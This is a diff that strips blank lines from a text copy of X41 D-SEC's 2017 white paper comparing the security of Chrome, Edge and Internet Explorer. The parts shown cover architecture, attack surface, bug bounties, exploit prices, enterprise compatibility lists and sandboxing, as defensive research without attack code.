@@ -63,12 +63,7 @@ page going offline. To read the original, follow the link above.
 Browser Security White Paper
                            Final Paper
 
-
-
                           2017-09-19
-
-
-
 
 Markus Vervier, Michele Orrù, Berend-Jan Wever, Eric Sesterhenn
                        X41 D-SEC GmbH
@@ -76,9 +71,6 @@ Markus Vervier, Michele Orrù, Berend-Jan Wever, Eric Sesterhenn
                        D-52068 Aachen
                 Amtsgericht Aachen: HRB19989
 Browser Security White Paper
-
-
-
 
                                                  Revision History
 
@@ -93,9 +85,6 @@ Browser Security White Paper
         8             2017-08-25   Final Paper          M. Vervier, M. Orrù, E. Sesterhenn, B.-J. Wever
         9             2017-09-19   Public Release       M. Vervier, M. Orrù, E. Sesterhenn, B.-J. Wever
         10            2017-09-29   Errata 1             M. Vervier, M. Orrù, E. Sesterhenn, B.-J. Wever
-
-
-
 
 X41 D-SEC GmbH                                                                                     Page 1 of 197
 Contents
@@ -132,14 +121,8 @@ Contents
          6.1.2    Microsoft Edge Enterprise Mode and Compatibility List . . . . . . . . . . . . . . . . . . . 30
    6.2 Enterprise Management Via Group Policies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33
 
-
-
-
                                                               2
 Browser Security White Paper
-
-
-
 
 7 Sandboxing                                                                                                                     35
     7.1 Sandboxing techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35
@@ -185,12 +168,8 @@ Browser Security White Paper
            9.3.7     Data Execution Prevention (DEP) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76
            9.3.8     HIGHENTROPYVA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76
 
-
 X41 D-SEC GmbH                                                                                                          Page 3 of 197
 Browser Security White Paper
-
-
-
 
            9.3.9     Extension Point DLLs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77
            9.3.10 Invalid Handles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77
@@ -236,12 +215,8 @@ Browser Security White Paper
     12.2 Phishing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111
            12.2.1 Google Safe Browsing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115
 
-
 X41 D-SEC GmbH                                                                                                        Page 4 of 197
 Browser Security White Paper
-
-
-
 
            12.2.2 Microsoft SmartScreen . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116
            12.2.3 Phishing Protection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116
@@ -288,12 +263,8 @@ Browser Security White Paper
     18.5 Mixed Content Enabled . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160
     18.6 Certificate Security for Transport Layer Security (TLS) . . . . . . . . . . . . . . . . . . . . . . . . . 160
 
-
 X41 D-SEC GmbH                                                                                                      Page 5 of 197
 Browser Security White Paper
-
-
-
 
            18.6.1 Choices of Certificate Authorities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160
            18.6.2 Public Key Pinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160
@@ -306,9 +277,6 @@ Browser Security White Paper
 21 Project Team                                                                                                          166
 
 A Appendix                                                                                                               169
-
-
-
 
 X41 D-SEC GmbH                                                                                                    Page 6 of 197
 1        Executive Summary
@@ -329,8 +297,6 @@ are aware that we could unconsciously be biased to produce results favorable to 
 attempted to eliminate this by being as transparent as possible about our decision-making processes and
 testing methodologies.
 
-
-
 RESULTS
 
 It is clearly visible that newer browsers like Google Chrome and Microsoft Edge are designed to be secure
@@ -345,13 +311,8 @@ to be weak in comparison to AppContainer based sandboxing in Microsoft Edge or t
 sandbox. Regarding security in enterprise environments, we found Microsoft Edge and Internet Explorer
 to be less secure due to legacy features. Notably, a default compatibility site list is active in Microsoft
 
-
-
                                                      7
 Browser Security White Paper
-
-
-
 
 Edge. Sites on this list trigger a dialogue encouraging the user to open the site in Internet Explorer. X41
 D-Sec GmbH was able to register an expired domain included in this list to demonstrate it. By triggering a
@@ -397,12 +358,8 @@ All three browsers have a number of attack vectors that can be used by attackers
 red teaming and other offensive activities. We consider this an important aspect of comparison since client-
 side and phishing are common attack vectors observed in the browser domain.
 
-
 X41 D-SEC GmbH                                                                                     Page 8 of 197
 Browser Security White Paper
-
-
-
 
 Internet Explorer and also Microsoft Edge are the most vulnerable to client-side attacks, not only for the
 number of exploits that have been released, but also because they still support legacy functionality like
@@ -446,9 +403,6 @@ No browser enforces this currently in a complete manner, yet Google Chrome has e
 for a more complete implementation. We found that Google Chrome is more strict in enforcing security
 restrictions, has a higher level of compartmentalization, and more secure defaults.
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 9 of 197
 2        Methodology
 
@@ -462,7 +416,6 @@ their specific security needs.
 We were able to identify a number of factors that may have influenced our efforts and the results of our
 testing, including the following:
 
-
    • some code is distributed as Open Source and could be inspected more closely than other code,
 
    • each browser supports different features (see 4),
@@ -475,11 +428,9 @@ testing, including the following:
 
    • and not all relevant aspects might be included in this paper.
 
-
 X41 D-Sec GmbH has attempted to limit the effect of these factors as much as possible.
 
 A previous report1 that is similar to this report received public criticism on the following items:
-
 
    • malware sample set may be skewed,
 
@@ -488,14 +439,8 @@ A previous report1 that is similar to this report received public criticism on t
    • malware blocking capabilities misinterpreted.
   1 https://accuvantstorage.blob.core.windows.net/web/files/AccuvantBrowserSecCompar_FINAL.pdf
 
-
-
-
                                                      10
 Browser Security White Paper
-
-
-
 
 We try to take this criticism into consideration as much as possible in the relevant sections. The interested
 reader should take a look at other studies regarding this subject as well (e.g. by NSS Labs2 ), which highlight
@@ -522,22 +467,15 @@ To make results reproducible our tools and tests are available at https://github
 
 The browsers versions analyzed in this report are:
 
-
     • Google Chrome 61.0.3163.100,
 
     • Microsoft Edge 40.15063.0.0 (EdgeHTML 15.15063), and
 
     • Internet Explorer 11.296.15063.0
 
-
 running on Microsoft Windows 10 Build 15063.rs2_release.170317-1834.
 
-
-
-
    2 https://research.nsslabs.com/reports?Cat0=6#cat0=22
-
-
 
 X41 D-SEC GmbH                                                                                     Page 11 of 197
 3         Introduction
@@ -557,7 +495,6 @@ limited privileges.
 We give an overview of the general architecture and the process models of the browsers. All browsers
 consist of several logical components that might be split over different processes:
 
-
    • Web engine / HTML rendering engine
 
    • JavaScript engine
@@ -565,7 +502,6 @@ consist of several logical components that might be split over different process
    • Data I/O such as network I/O and filesystem operations
 
    • Rendering / Graphics
-
 
 In addition to the above, browser may have built-in support for showing PDF files and Adobe Flash, and
 Internet Explorer supports a number of legacy technologies, including ActiveX and Browser Helper Object
@@ -577,22 +513,13 @@ processes. The client processes perform specific complex tasks such as rendering
 do not have access to most of the system. The broker process does have access to the system, but performs
 a very limited set of tasks.
 
-
                                                     12
 Browser Security White Paper
-
-
-
 
 All browsers use isolation techniques to enforce security restrictions. They are described in detail in
 section 7.
 
-
-
 3.1       GOOGLE CHROME
-
-
-
 
                                     Figure 3.1: Chrome Logical Components
 
@@ -609,7 +536,6 @@ the Chromium Project2 .
 The default process model in Google Chrome uses separate processes that all run the same process image
 (chrome.exe). These processes can be divided into the following types:
 
-
     • Browser Process (medium integrity)
 
     • GPU Process (low integrity)
@@ -622,19 +548,12 @@ The default process model in Google Chrome uses separate processes that all run 
    1 https://developers.google.com/v8/
    2 https://www.chromium.org
 
-
-
-
 X41 D-SEC GmbH                                                                               Page 13 of 197
 Browser Security White Paper
-
-
-
 
     • Watcher Process (medium integrity)
 
     • Utility Processes: Short lived processes for specific tasks (untrusted integrity)
-
 
 The logical components are not necessarily reflected in the process model. They are shown for Google
 Chrome in figure 3.1.
@@ -647,12 +566,7 @@ communication between the different processes.
 
 More information about the Google Chrome sandbox can be found in section 7.3.
 
-
-
 3.2       MICROSOFT EDGE
-
-
-
 
                                       Figure 3.2: Edge Logical Components
 
@@ -668,18 +582,13 @@ Internet Explorer— that was mostly rewritten according3 to Microsoft. Microsof
    3 https://blogs.windows.com/msedgedev/2015/02/26/a-break-from-the-past-the-birth-of-microsofts-new-web
 -rendering-engine/
 
-
 X41 D-SEC GmbH                                                                                  Page 14 of 197
 Browser Security White Paper
-
-
-
 
 JavaScript engine. The core of this engine, called ChakraCore4 , is open source.
 
 The default process model in Microsoft Edge uses separate processes that run a number of different
 binaries:
-
 
     • MicrosoftEdge.exe (medium integrity): Main browser process
 
@@ -698,7 +607,6 @@ binaries:
     • browser_broker.exe (medium integrity): Broker process
 
     • RuntimeBroker.exe (medium integrity): Permission Management
-
 
 Microsoft Edge is a Universal Windows Platform (UWP) application and these processes are therefore
 spawned from svchost.exe. This also means Microsoft Edge interacts with a number of other processes
@@ -724,13 +632,8 @@ webpage containing Flash is loaded, or an existing page running Flash is reloade
 process is not entirely clear, but the binary contains many strings of text that suggests it is used to check for
    4 https://github.com/microsoft/ChakraCore
 
-
-
 X41 D-SEC GmbH                                                                                       Page 15 of 197
 Browser Security White Paper
-
-
-
 
 updates. After the initial communication no further communication between content processes and this
 process were seen.
@@ -740,12 +643,7 @@ Object Model (DCOM) and Windows Runtime (WinRT), to the various sandboxed AppCon
 
 More information about the Microsoft Edge sandbox is given in section 7.5.
 
-
-
 3.3       MICROSOFT INTERNET EXPLORER (IE)
-
-
-
 
                                Figure 3.3: Internet Explorer Logical Components
 
@@ -766,12 +664,8 @@ available on 32-bit versions of Windows.
 
 In Microsoft Windows 10, Internet Explorer as a Metro App is replaced by Microsoft Edge, but the desktop
 
-
 X41 D-SEC GmbH                                                                                    Page 16 of 197
 Browser Security White Paper
-
-
-
 
 application is still available and can be used to browse websites that were designed for older versions of
 Internet Explorer and rely on legacy features that are not available in Microsoft Edge. This is especially
@@ -782,11 +676,9 @@ in Internet Explorer version 8 as depicted in figure 3.3.
 
 These logical components do not map to the process model one-to-one.
 
-
     • iexplorer.exe (medium integrity): Main browser process UI Frame and broker.
 
     • iexplorer.exe (low integrity): Tab processes for web content
-
 
 The main process functions as a broker and UI frame process and additional child-processes are created for
 rendering webpages in tabs. In versions of Microsoft Windows prior to Windows 10, tab processes can be
@@ -800,23 +692,16 @@ meaning no AppContainers are used.
 More information about the sandbox of Internet Explorer and lack of EPM in Microsoft Windows 10 can be
 found in section 7.5.
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 17 of 197
 4        Attack Surface
 
 In this section we will look at how complexity can affect the security of software. Software complexity itself
 is hard to quantify, but there are several ways one might consider approximating it.
 
-
-
 4.1     SUPPORTED STANDARDS
 
 Content can be specified in different ways, which a browser is required to support. This subsection
 compares the features supported.
-
-
 
 4.1.1    Web Technologies
 
@@ -827,19 +712,10 @@ At the time of 2017-04-27, Wikipedia1 listed the support as shown in Table 4.1.
                                                         Frames
                                                CSS2.1
 
-
-
-
                                                                                                                 SMIL
                                                                  XSLT
 
-
-
-
                                                                                                                        VML
-
-
-
 
                           Browser
 
@@ -850,21 +726,14 @@ At the time of 2017-04-27, Wikipedia1 listed the support as shown in Table 4.1.
                Table 4.1: Web Technologies supported by Browsers ( - True, # - False, G
                                                                                       # - Partly)
 
-
-
 The newer Web Forms standard is only supported by Microsoft Edge. Synchronized Multimedia Integration
 Language (SMIL) and Vector Markup Language (VML) are only supported by Internet Explorer, but not
 by the more modern browsers. Also, Internet Explorer 11 still supports VML when Internet Explorer 10
 document mode is set via meta tags.
   1 https://en.wikipedia.org/wiki/Comparison_of_web_browsers#Web_technology_support
 
-
-
                                                            18
 Browser Security White Paper
-
-
-
 
 Since features are more finegrained than just the support for a standard, the caniuse2 database3 was
 queried for more details. At 2017-07-05 a total of 417 features was listed in the database, therefore only a
@@ -877,8 +746,6 @@ summarized overview is given in table 4.2.
  Internet Explorer 11          168          184               66                 0
 
                        Table 4.2: Support for Frontend Web Technologies According to caniuse.com
-
-
 
 As shown, according to caniuse, Google Chrome supports the most features, Microsoft Edge coming in
 second, and Internet Explorer supports the least amount of features. Of the 417 features, 157 were
@@ -900,8 +767,6 @@ shown in table 4.3.
 
                                             Table 4.3: HTML 5 Test Scores
 
-
-
 Google Chrome received the highest HTML 5 scores, and possibly provides the biggest attack surface in
 this area compared to the other browsers. The older Internet Explorer supports the least amount of the
 newer features.
@@ -913,26 +778,14 @@ Wikipedia5 lists support for JavaScript technologies as shown in Table 4.4.
    4 http://acid3.acidtests.org/
    5 https://en.wikipedia.org/wiki/Comparison_of_web_browsers#JavaScript_support
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 19 of 197
 Browser Security White Paper
-
-
-
 
                                                                                                                                 XMLHttpRequest
                                                                          ECMAScript 3
 
-
-
-
                                                                                                                                                    Rich editing
                                                             JavaScript
-
-
-
 
                                                                                                                         DHTML
                                                                                         DOM 1
@@ -942,59 +795,36 @@ Browser Security White Paper
                                Browser
 
                                Google Chrome                                                            G
-                                                                                                        #
                                Microsoft Edge                                                           G
-                                                                                                        #
                                Internet Explorer
 
                                  Table 4.4: JavaScript Support ( - True, # - False, G
                                                                                     # - Partly)
-
-
 
 Besides the protocols to transfer content and the markup languages, other content is also parsed and
 displayed by the different browsers. Among this other content are images used in the websites.
 
 As of 2017-04-26, Wikipedia6 lists the support of image formats as shown in Table 4.5.
 
-
-
-
                                                                                                                                        2D Canvas
                                                   JPEG XR
-
-
-
 
                                                                                                  APNG
                                                                WebP
                                            JPEG
-
-
-
 
                                                                                                                                                         XBM
 
                                                                                                                                                                   BMP
                                                                                          PNG
 
-
-
                                                                                                          TIFF
-
-
 
                                                                                                                           PDF
                                                                                                                   SVG
 
-
-
-
                                                                                                                                                                         ICO
                                                                              GIF
-
-
-
 
                Browser
 
@@ -1008,8 +838,6 @@ As of 2017-04-26, Wikipedia6 lists the support of image formats as shown in Tabl
                                 Table 4.5: Image Format Support ( - True, # - False, G
                                                                                      # - Partly)
 
-
-
 The JPEG XR format developed by Microsoft is just supported by the Microsoft Browsers. In contrast, the
 WebP format developed by Google is just supported on Google Chrome. The Animated Portable Network
 Graphics (APNG) format and X BitMap (XBM) are supported by Google Chrome as well, and not by the
@@ -1017,20 +845,13 @@ Microsoft browsers, which are able to handle Tagged Image File Format (TIFF) fil
 supported native by Google Chrome and Microsoft Edge, whereas Internet Explorer can use the Adobe
 Plugin to display PDF content.
 
-
-
-
    6 https://en.wikipedia.org/wiki/Comparison_of_web_browsers#Image_format_support
-
-
 
 X41 D-SEC GmbH                                                                                                                                                                Page 20 of 197
 5        Organizational Security Aspects
 
 This section covers non-technical aspects of security including economic and social factors that reflect the
 state of play in application and platform security.
-
-
 
 5.1     BUG BOUNTIES
 
@@ -1041,8 +862,6 @@ third parties.
 
 The rewards offered by the bug bounty programs that cover issues in the web browsers are similar. But
 Google does offer rewards for a wider range of security issues.
-
-
 
 5.1.1    Google Chrome
 
@@ -1062,18 +881,11 @@ report (see table 5.1).
                                 Table 5.1: Google Chrome Bug Bounty Rewards
   1 https://www.google.com/about/appsecurity/chrome-rewards/
 
-
-
                                                       21
 Browser Security White Paper
 
-
-
-
 Google started the bug bounty program in 20102 when such programs were not very common yet, and paid
 prices up to $60,000 two years later3 .
-
-
 
 5.1.2      Microsoft Edge
 
@@ -1092,21 +904,15 @@ table 5.2). This program was changed5 into a sustained bug bounty program, which
 
                                 Table 5.2: Microsoft Edge Bug Bounty Rewards
 
-
-
 In addition to the browser security bug bounty program, Microsoft is offering bug bounties for mitigation
 bypasses6 and additional defense techniques. Microsoft started offering bug bounty programs in 20137 ,
 three years after Google.
-
-
 
 5.1.3      Internet Explorer
 
 As of 2017-06-07, no Internet Explorer specific bug bounty program exists. The last temporary bug bounty
 program ended on 2013-07-268 . It rewarded up to $11,000 for critical vulnerabilities that affected Internet
 Explorer 11 preview on the latest Microsoft Windows versions.
-
-
 
 5.2       EXPLOIT PRICING
 
@@ -1120,13 +926,8 @@ groups of people, such as security penetration testing teams, cyber criminals, l
    7 https://technet.microsoft.com/en-us/library/dn425036.aspx
    8 https://technet.microsoft.com/en-us/library/dn425036.aspx
 
-
-
 X41 D-SEC GmbH                                                                                    Page 22 of 197
 Browser Security White Paper
-
-
-
 
 gence agencies. Their price is influenced by supply (the number of issues that can be found and the effort
 required to find and exploit them) and demand (the number of buyers and what targets they are interested
@@ -1142,8 +943,6 @@ possibility that there are parties that are willing to offer much higher amounts
 The prices we found in the public sources are all very similar, at around $80,000 for a working exploit with
 sandbox escape.
 
-
-
 5.2.1      Zerodium
 
 As of 2017-08-23, Zerodium9 buys exploits for Google Chrome and Microsoft Edge. Until August 2017
@@ -1158,12 +957,8 @@ levels; one for an exploit without Sandbox Escape (SBX) and one that includes SB
 
                                          Table 5.3: Zerodium Exploit Prices
 
-
-
 The prices offered for Google Chrome are the highest. In general the prices offered are substantially higher
 than the bug bounties offered by the vendors.
-
-
 
 5.2.2      Pwn2Own
 
@@ -1177,13 +972,8 @@ offered by Zerodium. The history of the reward amounts offered can be seen in ta
  10 Deleted as of 2017-08-23
  11 http://zerodayinitiative.com/Pwn2Own2017Rules.html
 
-
-
 X41 D-SEC GmbH                                                                                    Page 23 of 197
 Browser Security White Paper
-
-
-
 
                   Browser              2017        2016        2015       2014       2013
 
@@ -1193,14 +983,8 @@ Browser Security White Paper
 
                                       Table 5.4: Pwn2Own Prices over the Years
 
-
-
-
 X41 D-SEC GmbH                                                                                  Page 24 of 197
 Browser Security White Paper
-
-
-
 
 5.2.3      vuldb
 
@@ -1208,43 +992,25 @@ vuldb12 is a vulnerability database, which calculates exploit prices for exploit
 2017-06-07, we queried their data to extract relevant information about our browser and constructed a
 chart (see figure 5.314 ).
 
-
-
-
                                          Figure 5.1: Google Chrome vuldb Prices
-
-
-
 
                                           Figure 5.2: Microsoft Edge vuldb Prices
 
-
-
-
                                          Figure 5.3: Internet Explorer vuldb Prices
-
 
 The prices calculated by vuldb are modeled after real market prices, but do not necessarily reflect them.
  12 https://vuldb.com/?
  13 https://vuldb.com/?doc.exploitprices
  14 CC BY-NC-SA 4.0., with permission of scip.ch
 
-
-
-
 X41 D-SEC GmbH                                                                                 Page 25 of 197
 Browser Security White Paper
-
-
-
 
 5.3       HISTORY OF VULNERABILITIES
 
 Investigating the security history of software projects can provide some insight into how security issues
 have been handled in the past. Though historical data does not necessarily reflect the current state of
 affairs, it should give some indication of the effectiveness of organizational processes surrounding security.
-
-
 
 5.3.1      Update Frequencies
 
@@ -1265,11 +1031,7 @@ only.
 To measure the update frequencies of Google Chrome, the Chrome Releases Blog15 was used, and the
 Channel Update for Desktop postings extracted.
 
-
-
-
                                  Figure 5.4: Google Chrome Update Frequency
-
 
 For Microsoft Edge and Internet Explorer (see figure 5.6), the Security Update Guide16 was used. The data
 follows the Patch Tuesday17 schedule of Microsoft, where updates are released on a schedule that allows
@@ -1282,29 +1044,15 @@ Microsoft’s adherence to the “Patch Tuesday” schedule can cause delays to 
  16 https://portal.msrc.microsoft.com/en-us/security-guidance
  17 https://en.wikipedia.org/wiki/Patch_Tuesday
 
-
-
 X41 D-SEC GmbH                                                                                    Page 26 of 197
 Browser Security White Paper
-
-
-
 
 portant updates that are longer than they are for Google Chrome, as Google Chrome updates are more
 frequent than Microsoft Edge or Internet Explorer updates.
 
-
-
-
                                   Figure 5.5: Microsoft Edge Update Frequency
 
-
-
-
                                Figure 5.6: Internet Explorer Update Frequency
-
-
-
 
 5.3.2      Time to Patch
 
@@ -1333,23 +1081,14 @@ were patched the fastest, with Internet Explorer issues being the slowest.
  18 https://www.zerodayinitiative.com/
  19 http://zerodayinitiative.com/advisories/published/2016/
 
-
-
 X41 D-SEC GmbH                                                                                Page 27 of 197
 Browser Security White Paper
 
-
-
-
                                           Figure 5.7: Days to Patch
-
 
 It should not come as a surprise that Google Chrome has the lowest time-to-patch, as Google released
 updates more frequently. Microsoft adheres to the once monthly Patch-Tuesday schedule, which means
 the release of updates may be delayed to fit into this schedule.
-
-
-
 
 X41 D-SEC GmbH                                                                           Page 28 of 197
 6        Enterprise Features
@@ -1358,8 +1097,6 @@ This report focuses on the Google Chrome, Microsoft Edge, and Internet Explorer 
 The following gives an overview of the enterprise features relevant to security. This report exclusively con-
 siders Microsoft Windows based enterprise environments, therefore centrally managed Chrome OS devices
 are not covered.
-
-
 
 6.1     LEGACY AND COMPATIBILITY FEATURES
 
@@ -1373,8 +1110,6 @@ network administrators to add only trusted sites to such legacy browsing whiteli
 Microsoft Edge offer different ways to configure whitelists that allow specific sites to be opened in Internet
 Explorer for access to legacy features.
 
-
-
 6.1.1    Chrome Legacy Browser Support
 
 Support for opening specific websites in Internet Explorer is available via the Chrome Legacy Browser Support
@@ -1387,21 +1122,13 @@ Google Chrome in order to exploit an Internet Explorer specific vulnerability. H
   1 https://chrome.google.com/webstore/detail/legacy-browser-support/heildphpnddilhkemkielfhnkaagiabh
   2 https://tools.google.com/dlpage/legacybrowsersupport
 
-
-
-
                                                       29
 Browser Security White Paper
-
-
-
 
 attacker does not control any website already in this list, the attacker would first have to try to add their
 website to the list defined by the group policy setting. Since an attacker who has this capability can already
 do worse things than reconfiguring legacy browser support, X41 D-Sec GmbH considers this strategy as
 secure.
-
-
 
 6.1.2      Microsoft Edge Enterprise Mode and Compatibility List
 
@@ -1412,13 +1139,11 @@ The list of sites to be opened in Internet Explorer must be specified using an E
 (XML) file. This is described in the article “Use Enterprise Mode to improve compatibility”3 by Microsoft. A list
 of example locations where this file can be stored are also provided in the documentation:
 
-
     • HTTP location: “SiteList”=“http://localhost:8080/sites.xml”
 
     • Local network: “SiteList”=“\\network\shares\sites.xml”
 
     • Local file: “SiteList”=“file:///c:\\Users\\<user>\\Documents\\testList.xml”
-
 
 X41 D-Sec GmbH does not consider all these locations to be adequately secure to store this sensitive
 information: network shares might be compromised by an attacker looking to move from one machine
@@ -1429,25 +1154,15 @@ Additionally, there is the Microsoft Compatibility List, which defines a list of
 opened in Internet Explorer by default. Use of this list can be configured using the “Allow Microsoft Compati-
 bility List” group policy setting and is enabled by default.
 
-
-
-
                                Figure 6.1: Microsoft Compatibility List (via about:compat)
-
 
 At the time of writing the list contains 1577 sites, of which figure 6.1 shows a sampling.
    3 https://docs.microsoft.com/en-us/microsoft-edge/deploy/emie-to-improve-compatibility
 
-
-
 X41 D-SEC GmbH                                                                                       Page 30 of 197
 Browser Security White Paper
 
-
-
-
                                                Figure 6.2: Legacy Dialog
-
 
 If a website on this list is opened in Microsoft Edge, a dialogue is shown which explains that this website
 depends on legacy technology and can only be opened using Internet Explorer, as shown in figure 6.2. The
@@ -1479,14 +1194,8 @@ X41 D-Sec GmbH identified 30 domains in this list that were no longer registered
 
                                  Table 6.1: Unregistered Websites in Compatibility List
 
-
-
-
 X41 D-SEC GmbH                                                                                       Page 31 of 197
 Browser Security White Paper
-
-
-
 
 As a Proof of Concept (PoC) X41 D-Sec GmbH registered the domain alljeju.net and hosted a website
 under our control there. We found that opening this website in Microsoft Edge provided us with the ex-
@@ -1501,14 +1210,8 @@ familiar with the dialogue and used to clicking through it to open certain websi
 Google Chrome has a clear advantage over Microsoft Edge in terms of secure interaction design and does
 not offer an easy workflow to open pages in Internet Explorer.
 
-
-
-
 X41 D-SEC GmbH                                                                                        Page 32 of 197
 Browser Security White Paper
-
-
-
 
 6.2       ENTERPRISE MANAGEMENT VIA GROUP POLICIES
 
@@ -1556,23 +1259,15 @@ The most interesting configuration options for Microsoft Edge and Google Chrome 
  Display warning when opening          n/a                                n/a                             Disabled
  Websites in Internet Explorer
 
-
                                                      Table 6.2: Group Policy Options
-
-
 
 In Google Chrome peripheral device access for WebUSB and WebBluetooth can be controlled via the
 DefaultWebBluetoothGuardSetting, DeviceAllowBluetooth, and UsbDetachableWhitelist group poli-
 cies. Security considerations regarding these features are given in chapter 13.
    4 Microsoft Compatibility List Active By Default.
 
-
-
 X41 D-SEC GmbH                                                                                                               Page 33 of 197
 Browser Security White Paper
-
-
-
 
 The default configuration is considered very permissive and show no mayor differences between the various
 browsers. Google Chrome has a wider range of policies that provides a more fine-grained control over the
@@ -1581,12 +1276,7 @@ configuration as described in the documentation5 . However, not all of these set
 X41 D-Sec GmbH recommends to lock down browsers using the policies by whitelisting a limited list of
 extensions and locking down the ability of users to turn off security mitigations.
 
-
-
-
    5 https://www.chromium.org/administrators/policy-list-3
-
-
 
 X41 D-SEC GmbH                                                                                 Page 34 of 197
 7        Sandboxing
@@ -1607,8 +1297,6 @@ other running processes, and/or the registry to gain more control over the syste
 the code can potentially be limited in what it can do to the point where the attacker does not gain anything
 useful by being able to execute arbitrary code.
 
-
-
 7.1     SANDBOXING TECHNIQUES
 
 There are a number of technologies and techniques that can be used to create a sandbox on Microsoft
@@ -1622,14 +1310,8 @@ techniques, we have decided to cover them in chapter 9.
   3 https://msdn.microsoft.com/en-us/library/windows/desktop/ms684161(v=vs.85).aspx
   4 https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088(v=vs.85).aspx
 
-
-
-
                                                       35
 Browser Security White Paper
-
-
-
 
 7.1.1      Integrity Levels
 
@@ -1638,7 +1320,6 @@ process can access. In short, the lower the integrity level of a process, the le
 If an object has a higher integrity level than a process, access to the object from the process is restricted
 or prevented based on policies. More details about this can be found in the documentation5 provided by
 Microsoft.
-
 
     • Medium and High Integrity Processes running with medium and high integrity have extensive access
        to system resources since many of these resources run with low or medium integrity. Medium
@@ -1673,14 +1354,8 @@ Microsoft.
    6 https://msdn.microsoft.com/en-us/library/bb625960.aspx
    7 https://en.wikipedia.org/wiki/User_Interface_Privilege_Isolation
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 36 of 197
 Browser Security White Paper
-
-
-
 
           – Named pipes, where the creator explicitly sets the mandatory label on the pipe to allow access
               to lower-integrity processes
@@ -1691,9 +1366,6 @@ Browser Security White Paper
        processes are restricted from accessing (writing) resources having a low, medium or high integrity
        level.
 
-
-
-
 7.1.2      AppContainers
 
 AppContainers are processes running in Microsoft Windows that have their access rights limited by denying
@@ -1703,7 +1375,6 @@ secured object by adding a specific entry to the white-list for that secured obj
 
 White-listing is done using Security Identifier (SID) in an Access Control Entry (ACE). There are three
 different types of SID that can be used to grant access based on specific criteria 8 :
-
 
     • Capability SIDs
        A Capability SID can be given to a process in order to give it access to a specific resource. There are a
@@ -1722,19 +1393,13 @@ different types of SID that can be used to grant access based on specific criter
        not have any access restrictions. For instance, the WinRT Application Programming Interface (API) is
        accessible to all AppContainers.
 
-
 The AC SID, which normally gives all AppContainers full access to a secured object has been disabled in
 Microsoft Edge AppContainers in order to further limit their access to the system. Replacements for
 secured objects with an AC SID that are required for Microsoft Edge to function have been created in a
    8 https://msdn.microsoft.com/en-us/library/windows/desktop/mt595898(v=vs.85).aspx
 
-
-
 X41 D-SEC GmbH                                                                                      Page 37 of 197
 Browser Security White Paper
-
-
-
 
 broker. All these replacements have either Capability SIDs and/or AppID SIDs applied to limit access to
 them to only those AppContainers that need them.
@@ -1752,7 +1417,6 @@ an AppContainer’s capabilities. A list of the capabilities we found, their SID
 available in appendix A.
 
 The most important app capabilities for our purpose are those used by Microsoft Edge:
-
 
     • internetClient: Allows apps to make connections to and receive incoming data from the Internet.
        This capability does not allow an app to act as a server and accept connections. It also does not
@@ -1783,14 +1447,8 @@ The most important app capabilities for our purpose are those used by Microsoft 
        sion. This is also referred to as NAMED CAPABILITIES\Extended Execution Unconstrained
    9 https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 38 of 197
 Browser Security White Paper
-
-
-
 
     • packageQuery: Allows apps to gather information about other apps. This is also referred to as
        NAMED CAPABILITIES\Package Query
@@ -1809,7 +1467,6 @@ Browser Security White Paper
        Windows.Services.TargetedContent namespace. It seems to be related10 to advertising related
        content that is specific for certain users. This is also referred to as NAMED CAPABILITIES\Targeted
        Content.
-
 
 Note that the network category of the local network determines the level of access granted with the
 internetClient: if the local network is set to private, AppContainers with this capability cannot connect
@@ -1830,14 +1487,8 @@ from processes sandboxed using only low integrity, as their access to the networ
  10 https://docs.microsoft.com/en-us/windows/uwp/publish/use-targeted-offers-to-maximize-engagement-and-c
 onversions
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 39 of 197
 Browser Security White Paper
-
-
-
 
 7.1.3      Job (Kernel) Objects
 
@@ -1845,7 +1496,6 @@ One of the oldest techniques on Microsoft Windows to restrict processes is using
 be used to set restrictions on a group of processes, e.g. to limit the amount of memory they can use. They
 also allow preventing process from performing certain actions, some of which are listed in the sandbox
 description document11 provided by the Chromium project:
-
 
     • Forbid per-use system-wide changes using SystemParametersInfo(), which can be used to swap the
        mouse buttons or set the screen saver timeout
@@ -1866,7 +1516,6 @@ description document11 provided by the Chromium project:
 
     • One active process limit (disallows creating child processes)
 
-
 As seen above, they can be quite beneficial to prevent certain dangerous actions. We tested the processes
 belonging to the browsers manually using the Process Explorer tool, and identified the job limits as displayed
 in figure 7.1, Google Chrome uses such restricted job objects for sandboxed renderers. Microsoft Edge uses
@@ -1874,8 +1523,6 @@ job limits to limit memory consumption in content processes and Internet Explore
 content processes are terminated when the job closes as seen in figure 7.2.
 
 More information about job objects can be found in the documentation12 by Microsoft.
-
-
 
 7.1.4      Other Sandboxing Settings and Techniques
 
@@ -1887,43 +1534,23 @@ and 7.4, the token for Google Chrome is more restricted.
 andbox.md#The-Job-object
  12 https://www.microsoft.com/msj/0399/jobkernelobj/jobkernelobj.aspx
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 40 of 197
 Browser Security White Paper
 
-
-
-
                                      Figure 7.1: Google Chrome Renderer Job Limits
 
-
-
-
                        Figure 7.2: Microsoft Edge and Internet Explorer Content-Process Job Limits
-
 
